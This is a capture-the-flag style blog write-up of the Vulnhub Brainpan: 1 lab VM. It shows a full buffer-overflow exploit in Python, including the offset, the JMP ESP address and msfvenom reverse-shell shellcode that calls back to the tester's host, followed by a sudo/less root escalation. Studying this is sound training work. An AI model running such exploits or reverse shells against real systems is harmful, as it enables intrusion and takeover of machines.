---
title:  "Vulnhub - Brainpan: 1"
date:   2019-10-19 12:15:00
categories: [Writeup]
tags: [Vulnhub, Brainpan, Buffer Overflow, OSCP]
---

### Intro

I am starting off this blog with a quick writeup on [Brainpan: 1][brainpan-link], a boot2root virtual machine that is an excellent introduction for anyone interested
in going down the challenging yet rewarding rabbithole that is exploit development.
It is also good practice for solidifying concepts taught in the Penetration Testing With Kali Linux course.

### Initial Discovery

After spinning up the VM, we are greeted with the login screen for the box.
![](/images/brainpan-1/1.jpg)

The first step will be to find the IP address of the VM on our network. So we'll do a quick nmap -sn (No port scan) on our local subnet (192.168.20.0/24) to find it.
![](/images/brainpan-1/2.jpg)

We'll ignore the Kali VM's IP at .132, the gateway at .1, and the host at .254. This leaves us with the .131 address.
Now we will run another nmap scan on that IP. This time with some additional flags to enumerate services.
![](/images/brainpan-1/3.jpg)

Looks like we get two open ports and a lot of text in the banner grab results.
![](/images/brainpan-1/4.jpg)

### Web Service (Port 10000)

First let's check out port 10000 since it appears to be a web service. The index page seems to be a Veracode PSA about to safe coding, interesting... There does not appear to be anything else in the index other than the Veracode image.
So lets run through some basic web directory enumeration with gobuster.
![](/images/brainpan-1/5.jpg)

We quickly get an interesting /bin directory back, lets check it out.
![](/images/brainpan-1/6.jpg)

All that seems to be present is an executable file, we'll go ahead and download it.
At this point we can check what is running on port 9999.
![](/images/brainpan-1/7.jpg)

### Mystery Service (Port 9999)

Looks like a login prompt, it is very likely that this is the application we found in /bin on the web service.
When we enter a random password, it gives an access denied message and terminates the connection. Lets try to send 1000 A's to it and see what happens.
![](/images/brainpan-1/8.jpg)

We did not get an access denied message that time, and when we try to connect we get a connection refused message.
![](/images/brainpan-1/9.jpg)

It seems like the application running on that port crashed as a result, so lets go ahead and restart the Brainpan VM to bring it back up and move on to the binary we found on the web service.

### Reproducing the Crash

Since this is an executable file, we should to move this over to a windows machine for further testing.
In this case I am using a 32 bit Windows 7 VM with Immunity Debugger and Mona installed.

First we'll start the application and make sure it is working. and attach to it with Immunity.
![](/images/brainpan-1/10.jpg)
![](/images/brainpan-1/11.jpg)
![](/images/brainpan-1/12.jpg)

Now we'll send the same payload of 1000 A's to our debugging VM. And we caught the crash in Immunity!
![](/images/brainpan-1/13.jpg)
![](/images/brainpan-1/14.jpg)

EIP gets overwritten with our payload and an exception is thrown due to 0x41414141 not being a valid address.

Now is a good time to make a skeleton exploit script to make it easier to repeat. We'll use Python 3 for this.
```
#!/usr/bin/python3

import sys
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

target = sys.argv[1]
port = 9999

payload = b"A" * 1000 + b'\r\n'

try:
    s.connect((target, port))
except socket.error as err:
    print("[!] Could not connect to target service")

s.recv(1024)

print("[*] Sending payload to target...")
s.send(payload)
s.close()
```

The script can be executed with the target IP as an argument:
`# python3 exploit.py 192.168.20.129`

### Finding the Offset

Since we can reproduce the crash by sending 1000 bytes to the application, we need to send a unique pattern of bytes so we can find out exactly where our payload overwrites EIP.
There are lots of ways to generate a pattern, such as the pattern_create and pattern_offset ruby scripts included in the Metasploit Framework.  
To generate the pattern, simply call the script and specify a length with the -l flag.
```
# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac
...snip...
Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
```

After we get the pattern from pattern_create, we need to add this to our script.
```
pattern = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"

payload = pattern + b'\r\n'
```

After restarting the application, reattaching, and then sending this new pattern, we can see EIP has been overwritten by the value 0x35724134.
![](/images/brainpan-1/17.jpg)

If we run those 4 bytes through pattern_offset, it tells us that the offset is at 524 bytes.
Knowing this, we can adjust our skeleton exploit script to send 524 A's, followed by 4 B's where we expect the EIP overwrite to take place, and then fill the remainder with C's.  
Our new payload should look like this:
`payload = (b"A" * 524) + (b"B" * 4) + (b"C" * (1000-524-4)) + b'\r\n'`

Restart, reattach, and send the updated payload, now EIP is overwritten with the hex equivalent of B (42) and the ESP register is pointing to the very beginning of our C's.
![](/images/brainpan-1/19.jpg)

### Redirecting Execution

So now we have control over the EIP register, which gives us the ability to execute any instruction in the application or associated DLLs. *As long as we have a consistent address to use.*
In this case, the ESP register is pointing to the beginning of our C's, so all we need is a simple JMP ESP instruction to redirect execution to an area of memory that we control.
Luckily, there are no protections such as DEP or ASLR in this challenge, so finding a suitable address should be pretty straight forward.

Just to make sure, we'll check to see if we have enough space at the end of our payload to include a reverse shell payload. Typically the shellcode required for a reverse shell is around 300-400 bytes after encoding.
![](/images/brainpan-1/20.jpg)

Great! We have 1D4 bytes of C's in the stack, this comes out to 468 bytes which is plenty of room for the shellcode we will be sending.

Mona will be very helpful for finding an appropriate instruction address to point ESP to. First we use `!mona jmp -r esp` to show all instances of JMP ESP in the application.
![](/images/brainpan-1/21.jpg)

Looks like we only have one JMP ESP instruction. We'll copy the address for it and add it to the script making sure to reverse the bytes to account for endianess.
```
# JMP ESP at 0x311712F3
payload = (b"A" * 524) + b"\xf3\x12\x17\x31" + (b"C" * (1000-524-4)) + b'\r\n'
```

Now we can set a breakpoint at 0x311712F3 in Immunity and try this new payload to see if we land in the area of the stack that we control.
![](/images/brainpan-1/22.jpg)

After hitting F8, ESP should be pointing to the beginning of our C's.
![](/images/brainpan-1/23.jpg)

### Finding Bad Characters

We now have control over EIP, and can reliably redirect execution to a section of the stack that we have control over. So all that is left is replacing the C's in our payload with usable shellcode to give us a reverse shell.
In order to generate the shellcode, we first need to identify any bad characters that may truncate or otherwise mangle our payload. Mona has our back again with `!mona bytearray`.  
Mona's bytearray function generates a full array of bytes from \x00 to \xff.
![](/images/brainpan-1/24.jpg)

After we generate our bytearray, it is a good idea to copy it from the output file that mona creates as the output in the console is likely truncated. Lets add this to our script as a new variable so we can send it along in place of our C's.  
We will go ahead and remove \x00 since it represents a null byte, which typically causes input functions to stop receiving data when they encounter it.
```
chars = ( 
b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

# JMP ESP at 0x311712F3
payload = (b"A" * 524) + b"\xf3\x12\x17\x31" + chars + b'\r\n'
```

After sending this new payload, we inspect the content in dump to look for any missing/truncated characters.
![](/images/brainpan-1/25.jpg)

Looks like there are no missing characters! This means that the null byte (\x00) was all we need to worry about. Next we'll generate some shellcode with msfvenom.
All we need in this case is a standard windows reverse tcp payload. The following command was used to generate the shellcode:
`# msfvenom -p windows/shell/reverse_tcp LHOST=192.168.20.132 LPORT=4444 -b "\x00" -f py`

The shellcode is then added to our script and integrated into our payload along with 32 NOP instructions (\x90) to give our payload some space to unpack.  
Our final exploit script should look like this:
```
#!/usr/bin/python3

import sys
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

target = sys.argv[1]
port = 9999

shellcode =  b""
shellcode += b"\xdb\xda\xbd\x36\x3b\xcf\x2d\xd9\x74\x24\xf4\x58\x31"
shellcode += b"\xc9\xb1\x56\x31\x68\x18\x83\xe8\xfc\x03\x68\x22\xd9"
shellcode += b"\x3a\xd1\xa2\x9f\xc5\x2a\x32\xc0\x4c\xcf\x03\xc0\x2b"
shellcode += b"\x9b\x33\xf0\x38\xc9\xbf\x7b\x6c\xfa\x34\x09\xb9\x0d"
shellcode += b"\xfd\xa4\x9f\x20\xfe\x95\xdc\x23\x7c\xe4\x30\x84\xbd"
shellcode += b"\x27\x45\xc5\xfa\x5a\xa4\x97\x53\x10\x1b\x08\xd0\x6c"
shellcode += b"\xa0\xa3\xaa\x61\xa0\x50\x7a\x83\x81\xc6\xf1\xda\x01"
shellcode += b"\xe8\xd6\x56\x08\xf2\x3b\x52\xc2\x89\x8f\x28\xd5\x5b"
shellcode += b"\xde\xd1\x7a\xa2\xef\x23\x82\xe2\xd7\xdb\xf1\x1a\x24"
shellcode += b"\x61\x02\xd9\x57\xbd\x87\xfa\xff\x36\x3f\x27\xfe\x9b"
shellcode += b"\xa6\xac\x0c\x57\xac\xeb\x10\x66\x61\x80\x2c\xe3\x84"
shellcode += b"\x47\xa5\xb7\xa2\x43\xee\x6c\xca\xd2\x4a\xc2\xf3\x05"
shellcode += b"\x35\xbb\x51\x4d\xdb\xa8\xeb\x0c\xb3\x1d\xc6\xae\x43"
shellcode += b"\x0a\x51\xdc\x71\x95\xc9\x4a\x39\x5e\xd4\x8d\x48\x48"
shellcode += b"\xe7\x42\xf2\x19\x19\x63\x02\x33\xde\x37\x52\x2b\xf7"
shellcode += b"\x37\x39\xab\xf8\xed\xd7\xa1\x6e\xce\x8f\xa2\xea\xa6"
shellcode += b"\xcd\xca\xe3\x6a\x58\x2c\x53\xc3\x0a\xe1\x14\xb3\xea"
shellcode += b"\x51\xfd\xd9\xe5\x8e\x1d\xe2\x2c\xa7\xb4\x0d\x98\x9f"
shellcode += b"\x20\xb7\x81\x54\xd0\x38\x1c\x11\xd2\xb3\x94\xe5\x9d"
shellcode += b"\x33\xdd\xf5\xca\x23\x1d\x06\x0b\xc6\x1d\x6c\x0f\x40"
shellcode += b"\x4a\x18\x0d\xb5\xbc\x87\xee\x90\xbf\xc0\x11\x65\x89"
shellcode += b"\xbb\x24\xf3\xb5\xd3\x48\x13\x35\x24\x1f\x79\x35\x4c"
shellcode += b"\xc7\xd9\x66\x69\x08\xf4\x1b\x22\x9d\xf7\x4d\x96\x36"
shellcode += b"\x90\x73\xc1\x71\x3f\x8c\x24\x02\x38\x72\xba\x2d\xe1"
shellcode += b"\x1a\x44\x6e\x11\xda\x2e\x6e\x41\xb2\xa5\x41\x6e\x72"
shellcode += b"\x45\x48\x27\x1a\xcc\x1d\x85\xbb\xd1\x37\x4b\x65\xd1"
shellcode += b"\xb4\x50\x96\xa8\xb5\x67\x57\x4d\xdc\x03\x58\x4d\xe0"
shellcode += b"\x35\x65\x9b\xd9\x43\xa8\x1f\x5e\x5b\x9f\x02\xf7\xf6"
shellcode += b"\xdf\x11\x07\xd3"

nops = b'\x90' * 32

# JMP ESP at 0x311712F3
payload = (b"A" * 524) + b"\xf3\x12\x17\x31" + nops + shellcode + b'\r\n'

try:
    s.connect((target, port))
except socket.error as err:
    print("[!] Could not connect to target service")

s.recv(1024)

print("[*] Sending payload to target...")
s.send(payload)
s.close()
```

Now lets test it out on our debugging machine. First we'll setup a listener on port 4444 with netcat and then run the exploit script against the debugging VM's IP.
![](/images/brainpan-1/26.jpg)

Now we just need to run it against the Brainpan VM, hmm...
![](/images/brainpan-1/27.jpg)

We don't have access to whoami, which is strange. It appears that we may be inside a Linux environment given the .sh file and directory "structure". Following this logic, lets assume /bin is present and attempt to run /bin/sh.
![](/images/brainpan-1/28.jpg)

Even more interesting, we can run bash. Just to make this a bit cleaner, lets use python to get a better tty.
![](/images/brainpan-1/29.jpg)

After some basic investigation, it appears that we have the ability to run `/home/anansi/bin/anansi_util` as root via sudo.
![](/images/brainpan-1/30.jpg)
![](/images/brainpan-1/31.jpg)

The 'manual' option definitely seems interesting. When it is passed in, it appears to land in something similar to 'less'. According to the man page for 'less' you can run bash commands while it is open by prepending '!' before a command.  
Knowing this, we can try to run a command like `!/bin/bash`.
![](/images/brainpan-1/32.jpg)

Success!

[brainpan-link]: https://www.vulnhub.com/entry/brainpan-1,51/